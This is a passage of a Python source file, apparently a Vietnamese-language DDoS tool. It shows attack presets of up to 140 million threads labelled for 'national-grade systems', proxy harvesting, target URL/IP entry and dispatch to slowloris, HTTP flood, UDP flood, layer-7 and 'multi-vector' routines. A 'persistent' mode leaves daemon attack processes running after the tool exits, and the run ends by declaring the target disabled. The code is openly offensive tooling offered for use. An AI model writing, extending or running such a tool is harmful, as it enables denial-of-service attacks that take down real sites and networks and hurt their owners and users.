    {"id": "22", "name": "titan", "threads": 10000000, "requests": 2000, "desc": "Titan attack with 10M threads", "level": "Extreme", "application": "Massive systems"},
    {"id": "23", "name": "void", "threads": 46800000, "requests": 2000, "desc": "Void attack with 46.8M threads", "level": "Extreme", "application": "Highly resilient targets"},
    {"id": "24", "name": "abyss", "threads": 140000000, "requests": 2000, "desc": "Abyss attack with 140M threads", "level": "Extreme", "application": "National-grade systems"},
]

# Display ordered functions
def display_ordered_functions():
    clear_screen()
    display_header()
    print(f"┌──(quangbao㉿attack)-[~]\n└─$ {Fore.CYAN}{Style.BRIGHT}**_24 CHIẾN LƯỢC TẤN CÔNG (Sắp xếp theo Cường độ)_**{Style.RESET_ALL}{Fore.RESET}\n")
    for idx, func in enumerate(TARGET_CONFIGS, 1):
        print(f"┌──(quangbao㉿attack)-[~]\n└─$ {Fore.YELLOW}{idx}. **_{func['name'].upper()}_** (ID: {func['id']})")
        print(f"   - Mô tả: {func['desc']}")
        print(f"   - Luồng: {func['threads']:,}")
        print(f"   - Yêu cầu/Luồng: {func['requests']:,}")
        print(f"   - Tổng Hits: {func['threads'] * func['requests']:,}")
        print(f"   - Cấp độ: {func['level']}")
        print(f"   - Ứng dụng: {func['application']}{Fore.RESET}\n")
    input(f"┌──(quangbao㉿attack)-[~]\n└─$ {Fore.CYAN}**_Nhấn Enter để quay lại menu chính..._**{Fore.RESET}")

# Display target menu
def display_target_menu():
    clear_screen()
    display_header()
    print(f"┌──(quangbao㉿attack)-[~]\n└─$ {Fore.CYAN}{Style.BRIGHT}✸ CHỌN CHIẾN LƯỢC TẤN CÔNG ✸{Style.RESET_ALL}{Fore.RESET}")
    print(f"{Fore.MAGENTA}╔{'═' * 94}╗{Fore.RESET}")
    print(f"║ {Fore.CYAN}ID{' ' * 2}│ {Fore.CYAN}Tên{' ' * 10}│ {Fore.CYAN}Mô tả{' ' * 37}│ {Fore.CYAN}Luồng{' ' * 10}│ {Fore.CYAN}Cấp độ{' ' * 7}│{Fore.RESET}")
    print(f"║{'─' * 94}║")
    print(f"║ {Fore.YELLOW}0{' ' * 3}│ {'Xem Chiến lược':<14}│ {'Hiển thị thông tin chi tiết':<42}│ {'-':<15}│ {'-':<14}│{Fore.RESET}")
    colors = [Fore.YELLOW, Fore.RED, Fore.GREEN, Fore.MAGENTA]
    for idx, target in enumerate(TARGET_CONFIGS):
        name = target['name'].upper()
        desc = target['desc'][:39] + '...' if len(target['desc']) > 39 else target['desc']
        threads = f"{target['threads']:,}"
        color = colors[idx % len(colors)]
        print(f"║ {color}{target['id']:<3} │ {name:<14}│ {desc:<42}│ {threads:<15}│ {target['level']:<14}│{Fore.RESET}")
    print(f"{Fore.MAGENTA}╚{'═' * 94}╝{Fore.RESET}")
    print(f"┌──(quangbao㉿attack)-[~]\n└─$ {Fore.RED}{Back.CYAN}{Style.BRIGHT}➤ Chọn tùy chọn (0-24): {Style.RESET_ALL}{Fore.WHITE}", end="")

# Main function
async def main():
    check_file_integrity()
    display_header()
    multiprocessing.set_start_method('spawn')
    
    # Prompt for proxies and fetch if needed
    should_fetch_proxies = get_user_proxies()
    if should_fetch_proxies:
        print(f"┌──(quangbao㉿attack)-[~]\n└─$ {Fore.YELLOW}[✓] **_Fetching proxies from APIs..._**{Fore.RESET}")
        await fetch_proxies()
    print(f"┌──(quangbao㉿attack)-[~]\n└─$ {Fore.GREEN}[✓] **_Total proxies loaded: {len(PROXY_LIST)}_**{Fore.RESET}")

    while True:
        try:
            if not validate_key():
                print(f"┌──(quangbao㉿attack)-[~]\n└─$ {Fore.RED}{Style.BRIGHT}[!] **_Tấn công bị hủy - Xác thực thất bại_**{Style.RESET_ALL}{Fore.RESET}")
                exit(1)

            display_target_menu()
            choice = input().strip()

            if choice == "0":
                display_ordered_functions()
                continue

            target = next((t for t in TARGET_CONFIGS if t['id'] == choice), None)
            if not target:
                print(f"┌──(quangbao㉿attack)-[~]\n└─$ {Fore.RED}[!] **_Lựa chọn không hợp lệ! Thử lại._**{Fore.RESET}")
                time.sleep(1)
                continue
            target_selection_effect(target['name'])

            base_threads = target['threads']
            base_requests = target['requests']

            if target['name'] == "persistent":
                print(f"┌──(quangbao㉿attack)-[~]\n└─$ {Fore.RED}{Style.BRIGHT}[!] **_CẢNH BÁO: Tấn công sẽ chạy nền ngay cả khi thoát tool!_**{Style.RESET_ALL}{Fore.RESET}")
                print(f"┌──(quangbao㉿attack)-[~]\n└─$ {Fore.YELLOW}**_Để dừng: Dùng 'killall python3' (Linux/Termux) hoặc Task Manager (Windows)_**{Fore.RESET}")

            print(f"┌──(quangbao㉿attack)-[~]\n└─$ {Fore.MAGENTA}{Back.BLACK}{Style.BRIGHT}✸ NHẬP MỤC TIÊU URL HOẶC IP ✸{Style.RESET_ALL}{Fore.RESET}")
            input_url = input(f"┌──(quangbao㉿attack)-[~]\n└─$ {Fore.RED}{Back.CYAN}{Style.BRIGHT}➤ TARGET: {Style.RESET_ALL}{Fore.WHITE}").strip()
            if not input_url:
                print(f"┌──(quangbao㉿attack)-[~]\n└─$ {Fore.RED}[!] **_URL/IP không được để trống! Thử lại._**{Fore.RESET}")
                time.sleep(1)
                continue

            try:
                validated_url = validate_url(input_url)
                host = urllib.parse.urlparse(validated_url).hostname
                port = urllib.parse.urlparse(validated_url).port or 80
            except ValueError:
                host = input_url
                port = 80
                validated_url = f"http://{host}"
                print(f"┌──(quangbao㉿attack)-[~]\n└─$ {Fore.YELLOW}[✓] **_Xử lý mục tiêu như IP: {host}_**{Fore.RESET}")

            print(f"┌──(quangbao㉿attack)-[~]\n└─$ {Fore.YELLOW}{Style.BRIGHT}[✓] **_Mục tiêu đã khóa: {validated_url}_**{Style.RESET_ALL}{Fore.RESET}")

            if target['name'] not in ("infinite", "unlimited", "overload429403", "blitz522", "combined", "persistent", "layer3_4", "multi_vector", "layer7"):
                confirm = input(f"┌──(quangbao㉿attack)-[~]\n└─$ {Fore.RED}{Back.CYAN}{Style.BRIGHT}[!] **_Xác nhận tấn công (y/n):_** {Style.RESET_ALL}{Fore.RESET}").lower().strip()
                if confirm != 'y':
                    print(f"┌──(quangbao㉿attack)-[~]\n└─$ {Fore.YELLOW}{Style.BRIGHT}[✓] **_Tấn công bị hủy_**{Fore.RESET}")
                    continue

            security_level, recommended_threads, recommended_requests = await assess_target_security(validated_url)

            if security_level == "LOW":
                NUM_THREADS = min(recommended_threads, base_threads // 2)
                REQUESTS_PER_THREAD = min(recommended_requests, base_requests // 2)
                attack_strategy = "TẤN CÔNG NHẸ"
            elif security_level == "MEDIUM":
                NUM_THREADS = base_threads
                REQUESTS_PER_THREAD = base_requests
                attack_strategy = "LỰC TẤN CÔNG VỪA"
            else:
                NUM_THREADS = max(recommended_threads, base_threads)
                REQUESTS_PER_THREAD = max(recommended_requests, base_requests)
                attack_strategy = "TẤN CÔNG TỐI ĐA"

            print(f"""
┌──(quangbao㉿attack)-[~]
└─$ {Fore.CYAN}{Style.BRIGHT}
[✓] **_CHIẾN LƯỢC TẤN CÔNG: {target['name'].upper()}_**
[✓] **_Mục tiêu: {validated_url}_**
[✓] **_Luồng: {NUM_THREADS:,}_**
[✓] **_Yêu cầu/Luồng: {REQUESTS_PER_THREAD:,}_**
[✓] **_Chiến lược: {attack_strategy}_**
[✓] **_Tổng Hits: {NUM_THREADS * REQUESTS_PER_THREAD:,}_**
{Style.RESET_ALL}{Fore.RESET}
            """)
            print(f"┌──(quangbao㉿attack)-[~]\n└─$ {Fore.RED}{Style.BRIGHT}[✓] **_Khởi động tấn công..._**{Style.RESET_ALL}{Fore.RESET}")

            start_time = time.time()
            async with aiohttp.ClientSession() as session:
                if target['name'] == "persistent":
                    save_attack_config(validated_url, NUM_THREADS, REQUESTS_PER_THREAD, target['name'])
                    processes = []
                    for _ in range(min(NUM_THREADS, multiprocessing.cpu_count() * 4)):  # Doubled process count
                        p = multiprocessing.Process(target=lambda: asyncio.run(persistent_attack_process(validated_url, session)))
                        p.daemon = True
                        processes.append(p)
                        p.start()
                    print(f"┌──(quangbao㉿attack)-[~]\n└─$ {Fore.RED}{Style.BRIGHT}[✓] **_Tấn công liên tục đã khởi động với {len(processes)} tiến trình! Dùng 'killall python3' hoặc Task Manager để dừng._**{Style.RESET_ALL}{Fore.RESET}")
                    time.sleep(2)
                    exit(0)
                elif target['name'] == "unlimited":
                    tasks = [unlimited_threads_attack(validated_url, session) for _ in range(NUM_THREADS)]
                    await asyncio.gather(*tasks)
                elif target['name'] == "overload429403":
                    tasks = [overload_429_403_attack(validated_url, session, REQUESTS_PER_THREAD) for _ in range(NUM_THREADS)]
                    await asyncio.gather(*tasks)
                elif target['name'] == "blitz522":
                    tasks = [blitz_522_attack(validated_url, session, REQUESTS_PER_THREAD) for _ in range(NUM_THREADS)]
                    await asyncio.gather(*tasks)
                elif target['name'] == "combined":
                    tasks = [combined_all_attack(validated_url, session, REQUESTS_PER_THREAD) for _ in range(NUM_THREADS)]
                    await asyncio.gather(*tasks)
                elif target['name'] == "layer3_4":
                    threads = [threading.Thread(target=udp_flood_attack, args=(host, port)) for _ in range(NUM_THREADS)]
                    for t in threads:
                        t.start()
                    for t in threads:
                        t.join()
                elif target['name'] == "multi_vector":
                    tasks = [multi_vector_attack(validated_url, session, REQUESTS_PER_THREAD) for _ in range(NUM_THREADS)]
                    await asyncio.gather(*tasks)
                elif target['name'] == "layer7":
                    tasks = [layer7_attack(validated_url, session, REQUESTS_PER_THREAD) for _ in range(NUM_THREADS)]
                    await asyncio.gather(*tasks)
                else:
                    tasks = [
                        slowloris_attack(validated_url, session, 60),  # Doubled duration
                        http_flood_attack(validated_url, session, NUM_THREADS * 4),  # Doubled intensity
                        *[send_request(validated_url, session, REQUESTS_PER_THREAD) for _ in range(NUM_THREADS)]
                    ]
                    await asyncio.gather(*tasks)

            end_time = time.time()
            total_time = end_time - start_time

            with manager:
                if response_times:
                    avg_response_time = sum(response_times) / len(response_times)
                    max_response_time = max(response_times)
                    min_response_time = min(response_times)
                else:
                    avg_response_time = 0
                    max_response_time = 0
                    min_response_time = 0

            print(f"""
┌──(quangbao㉿attack)-[~]
└─$ {Fore.CYAN}{Style.BRIGHT}
[✓] **_BÁO CÁO CHIẾN DỊCH: {target['name'].upper()}_**
[✓] **_Tổng Hits: {(NUM_THREADS * REQUESTS_PER_THREAD):,}_**
[✓] **_Thành công: {success_count:,} ({success_count/(NUM_THREADS * REQUESTS_PER_THREAD)*100:.1f}%)_**
[✓] **_Thất bại: {error_count:,} ({error_count/(NUM_THREADS * REQUESTS_PER_THREAD)*100:.1f}%)_**
[✓] **_Tổng thời gian: {total_time:.2f} giây_**
[✓] **_Thời gian phản hồi TB: {avg_response_time:.2f}ms_**
[✓] **_Hiệu suất đỉnh: {max_response_time:.2f}ms_**
[✓] **_Độ trễ thấp nhất: {min_response_time:.2f}ms_**
[✓] **_Hits/Giây: {(NUM_THREADS * REQUESTS_PER_THREAD)/total_time:.0f}_**
[✓] **_MỤC TIÊU ĐÃ BỊ VÔ HIỆU HÓA!_**
{Style.RESET_ALL}{Fore.RESET}
            """)

        except KeyboardInterrupt:
            print(f"┌──(quangbao㉿attack)-[~]\n└─$ {Fore.YELLOW}{Style.BRIGHT}[✓] **_Tấn công bị dừng bởi người dùng_**{Style.RESET_ALL}{Fore.RESET}")
            exit(0)
        except Exception as e:
            print(f"┌──(quangbao㉿attack)-[~]\n└─$ {Fore.RED}{Style.BRIGHT}[!] **_Lỗi nghiêm trọng: {str(e)}_**{Style.RESET_ALL}{Fore.RESET}")
            exit(1)

if __name__ == "__main__":
    asyncio.run(main())